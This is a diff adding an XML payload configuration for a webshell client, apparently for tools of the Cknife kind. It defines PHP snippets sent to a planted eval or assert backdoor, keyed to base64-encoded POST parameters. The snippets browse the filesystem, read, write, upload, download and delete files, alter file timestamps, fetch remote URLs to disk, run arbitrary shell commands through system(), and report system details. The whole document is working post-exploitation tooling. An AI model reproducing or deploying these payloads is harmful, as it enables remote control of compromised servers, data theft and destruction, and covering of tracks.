@@ -1,0 +1,250 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+    <func>
+      <name>WwwRootPathCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+      <item><![CDATA[$D=dirname($_SERVER["SCRIPT_FILENAME"]);
+if($D=="") $D=dirname($_SERVER["PATH_TRANSLATED"]);
+$R="{$D}\t";
+if(substr($D,0,1)!="/")
+{
+	foreach(range("A","Z") as $L)
+		if(is_dir("{$L}:"))
+			$R.="{$L}: ";
+}
+else $R.="/";
+print $R;]]></item>	  
+    </func>
+    <func>
+      <name>FileTreeCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
+      <item><![CDATA[$D=base64_decode($_POST["$dirPath$"]);
+$f=@opendir($D);
+if ($f==NULL) {
+    print("ERROR://Path Not Found Or No Permission");
+}
+else {
+    $M=NULL;
+    $L=NULL;
+    while ($N=@readdir($f)) {
+        if ($N != '.' && $N != '..') {
+            $P=$D.'/'.$N;
+            $T=@date('Y-m-d H:i:s',filemtime($P));
+            $S=@sprintf('%u', @filesize($P));
+            $E=@substr(base_convert(@fileperms($P),10,8),-4);
+            if (@is_dir($P)) $N.='/';
+            $M.=$N."\t".$T."\t".$S."\t".$E."\n";
+        }
+    }
+    print $M;
+    @closedir($f);
+}]]></item>
+    </func>
+    <func>
+      <name>ReadFileCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+      <item><![CDATA[$F=base64_decode($_POST["$filePath$"]);
+$P=@fopen($F,"r");
+print(@fread($P,filesize($F)));
+@fclose($P);]]></item>
+    </func>
+    <func>
+      <name>WriteFileCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >fileContext</funcParam>
+      <item><![CDATA[$f=base64_decode($_POST["$filePath$"]);
+$buf=base64_decode($_POST["$fileContext$"]);
+print @fwrite(fopen($f,"w"),$buf)?"1":"0";]]></item>
+    </func>
+    <func>
+      <name>DeleteFileOrDirCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
+      <item><![CDATA[function df($p)
+{
+    $m=@dir($p);
+    while (@$f=$m->read())
+    {
+        $pf=$p."/".$f;
+        if ((is_dir($pf))&&($f!=".")&&($f!="..")) {
+            @chmod($pf,0777);
+            df($pf);
+        }if (is_file($pf)) {
+            @chmod($pf,0777);
+            @unlink($pf);
+        }
+    }$m->close();
+    @chmod($p,0777);
+    return @rmdir($p);
+}
+$F=base64_decode($_POST["$fileOrDirPath$"]);
+if (is_dir($F)) print(df($F));
+else {
+print(file_exists($F)?@unlink($F)?"1":"0":"0");
+};]]></item>
+    </func>
+    <func>
+      <name>DownloadFileCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >filePath</funcParam>
+      <item><![CDATA[$F=base64_decode($_POST["$filePath$"]);
+$fp=@fopen($F,"r");
+if(@fgetc($fp))
+{
+	@fclose($fp);
+	@readfile($F);
+}
+else
+{
+	print("ERROR://Can Not Read");
+}]]></item>
+    </func>
+    <func>
+      <name>UploadFileCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >savefilePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >fileHexContext</funcParam>
+      <item><![CDATA[$f=base64_decode($_POST["$savefilePath$"]);
+$c=base64_decode($_POST["$fileHexContext$"]);
+$c=str_replace("\r","",$c);
+$c=str_replace("\n","",$c);
+$buf="";
+for ($i=0; $i<strlen($c); $i+=2)$buf.=urldecode("%".substr($c,$i,2));
+print(@fwrite(fopen($f,"w"),$buf)?"1":"0");]]></item>
+    </func>
+    <func>
+      <name>CopyFileOrDirCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >sourceFilePath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >targetFilePath</funcParam>
+      <item><![CDATA[function xcopy($src,$dest)
+{
+	if(is_file($src))
+	{
+		if(!copy($src,$dest))
+			return false;
+		else 
+			return true;
+	}
+	$m=@dir($src);
+	if(!is_dir($dest))
+		if(!@mkdir($dest))
+			return false;
+	while($f=$m->read())
+	{
+		$isrc=$src."/".$f;
+		$idest=$dest."/".$f;
+		if((is_dir($isrc))&&($f!=".")&&($f!=".."))
+		{
+			if(!xcopy($isrc,$idest))
+				return false;
+		}
+		else if(is_file($isrc))
+		{
+			if(!copy($isrc,$idest))
+				return false;
+		}
+	}
+	return true;
+}
+$fc=base64_decode($_POST["$sourceFilePath$"]);
+$fp=base64_decode($_POST["$targetFilePath$"]);
+print(xcopy($fc,$fp)?"1":"0");]]></item>
+    </func>
+    <func>
+      <name>RenameFileOrDirCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >oldName</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >newName</funcParam>
+      <item><![CDATA[$src=base64_decode($_POST["$oldName$"]);
+$dst=base64_decode($_POST["$newName$"]);
+print(rename($src,$dst)?"1":"0");]]></item>
+    </func>
+    <func>
+      <name>CreateDirCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >dirPath</funcParam>
+      <item><![CDATA[$f=base64_decode($_POST["$dirPath$"]);
+print(mkdir($f)?"1":"0");]]></item>
+    </func>
+    <func>
+      <name>ModifyFileOrDirTimeCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >fileOrDirPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >aTime</funcParam>
+      <item><![CDATA[$FN=base64_decode($_POST["$fileOrDirPath$"]);
+$TM=strtotime(base64_decode($_POST["$aTime$"]));
+if(file_exists($FN))
+{
+	print(@touch($FN,$TM,$TM)?"1":"0");
+}
+else
+{
+	print("0");
+}]]></item>
+    </func>
+    <func>
+      <name>WgetCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Base64" >urlPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >saveFilePath</funcParam>
+      <item><![CDATA[$fR=base64_decode($_POST["$urlPath$"]);
+$fL=base64_decode($_POST["$saveFilePath$"]);
+$F=@fopen($fR,'r');
+$L=@fopen($fL,'w');
+if($F && $L)
+{
+	while(!feof($F))
+		@fwrite($L,@fgetc($F));
+	@fclose($F);
+	@fclose($L);
+	print("1");
+}
+else
+{	
+	print("0");
+}]]></item>
+    </func>
+    <func>
+      <name>ExecuteCommandCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/Cmder</path>
+	  <funcParam location="Body" encrymode="Base64" >cmdPath</funcParam>
+	  <funcParam location="Body" encrymode="Base64" >command</funcParam>
+      <item><![CDATA[$p=base64_decode($_POST["$cmdPath$"]);
+$s=base64_decode($_POST["$command$"]);
+$d=dirname($_SERVER["SCRIPT_FILENAME"]);
+$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
+$r="{$p} {$c}";
+@system($r." 2>&1",$ret);
+print ($ret!=0)?"ret={$ret}":"";]]></item>
+    </func>
+    <func>
+      <name>SysInfoCode</name>
+	  <type>phpEval,phpEval_Cookie,phpAssert</type>
+	  <path>/Cmder</path>
+      <item><![CDATA[$d=dirname($_SERVER["SCRIPT_FILENAME"]);
+$r="{$d}\t";
+$r.=php_uname()."\t";
+$r.="(".@get_current_user().")\t";
+$r.=DIRECTORY_SEPARATOR;
+print $r;]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
